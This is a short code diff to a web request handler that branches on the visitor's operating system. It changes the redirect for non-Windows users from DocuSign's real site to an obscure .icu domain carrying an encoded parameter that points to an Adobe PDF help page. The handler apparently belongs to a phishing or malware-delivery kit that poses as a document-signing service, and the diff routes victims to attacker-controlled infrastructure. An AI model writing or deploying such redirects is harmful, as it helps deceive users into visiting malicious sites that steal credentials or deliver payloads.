@@ -38,7 +38,7 @@ export default function handler(req, res) {
 
   } else {
     // Redirect non-Windows users to DocuSign
-    res.writeHead(302, { Location: 'https://www.docusign.com' });
+    res.writeHead(302, { Location: 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=' });
     res.end();
   }
 }
